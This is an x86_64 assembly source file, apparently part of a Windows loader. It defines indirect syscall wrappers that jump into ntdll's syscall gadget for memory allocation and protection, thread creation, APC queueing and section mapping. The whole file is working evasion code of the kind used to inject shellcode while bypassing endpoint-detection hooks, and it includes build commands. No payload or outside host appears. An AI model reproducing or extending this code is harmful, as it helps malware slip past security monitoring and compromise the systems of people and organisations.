/*
 * syscalls_asm.S - Indirect syscall stubs (x86_64, GAS syntax)
 *
 * Each wrapper:
 *   1. Moves the first argument (rcx) into r10 (Windows syscall ABI)
 *   2. Loads the SSN from the global syscall_entry_t into eax
 *   3. Jumps to the syscall gadget address inside ntdll
 *
 * The caller sets up all arguments per the Windows x64 calling
 * convention (rcx, rdx, r8, r9, stack).  Stack-based arguments
 * (5th parameter onward) are already in place and untouched.
 *
 * Build: compile with gcc/clang alongside .c sources
 *   x86_64-w64-mingw32-gcc -c syscalls_asm.S -o syscalls_asm.o
 *   clang --target=x86_64-w64-mingw32 -c syscalls_asm.S -o syscalls_asm.o
 *
 * Guarded by USE_INDIRECT_SYSCALLS -- if not defined, this file
 * assembles to nothing (the .ifdef is a GAS directive).
 */

#include "config.h"
#if USE_INDIRECT_SYSCALLS

.intel_syntax noprefix

.text

/*
 * Macro: define an indirect syscall wrapper.
 *
 * Each sc_<name> is a syscall_entry_t struct laid out as:
 *   offset 0:  DWORD ssn          (4 bytes, padded to 8)
 *   offset 8:  PVOID syscall_addr (8 bytes)
 *
 * The wrapper does NOT use the stack or touch any volatile registers
 * beyond r10 and eax, which the kernel expects to be set this way.
 * r11 is volatile in the Windows x64 ABI and safe to clobber.
 */
.macro INDIRECT_SYSCALL name

.globl Indirect\name
.def   Indirect\name; .scl 2; .type 32; .endef

Indirect\name:
    mov   r10, rcx
    mov   eax, dword ptr [rip + sc_\name]
    mov   r11, qword ptr [rip + sc_\name + 8]
    jmp   r11

.endm

/* ------------------------------------------------------------------ */
/*  Stubs for every Nt function defined in ntapi.h                     */
/* ------------------------------------------------------------------ */

INDIRECT_SYSCALL NtAllocateVirtualMemory
INDIRECT_SYSCALL NtProtectVirtualMemory
INDIRECT_SYSCALL NtCreateThreadEx
INDIRECT_SYSCALL NtQueueApcThread
INDIRECT_SYSCALL NtTestAlert
INDIRECT_SYSCALL NtWaitForSingleObject
INDIRECT_SYSCALL NtCreateSection
INDIRECT_SYSCALL NtMapViewOfSection

#endif /* USE_INDIRECT_SYSCALLS */
